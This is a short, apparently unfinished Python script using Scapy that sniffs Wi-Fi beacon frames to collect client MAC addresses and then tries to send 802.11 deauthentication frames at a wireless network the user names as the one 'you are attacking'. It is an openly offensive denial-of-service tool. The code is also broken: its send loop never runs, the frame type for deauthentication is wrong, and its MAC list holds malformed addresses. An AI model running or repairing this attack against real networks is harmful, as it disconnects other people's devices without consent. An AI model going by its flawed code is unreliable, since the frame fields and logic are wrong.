from scapy.all import *
import scapy.all as scapy
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap

mac_addresses = ['10:00:00:00', '20:00:00:00']

def PacketHandler(packet):
    if packet.haslayer(Dot11):
        if packet.type == 0 and packet.subtype == 8:
            if packet.addr1 not in mac_addresses:
                mac_addresses.append(packet.addr2)

def deauth(gateway):
    x=0
    while x > 5:
        for addr in mac_addresses:
            print('hello')
            dot11 = Dot11(type= 8, subtype= 12, addr1= gateway, addr2= addr)
            print('here')
            packet = RadioTap()/dot11
            sendp(packet)
            x += 1
                    

def main():
    gateway = input('What is the mac address of the WLAN you are attacking?: ')
    scapy.sniff(iface="Intel(R) Wi-Fi 6E AX211 160MHz", prn = PacketHandler, count= 5)
    print('test')
    deauth(gateway)
    

main()

            


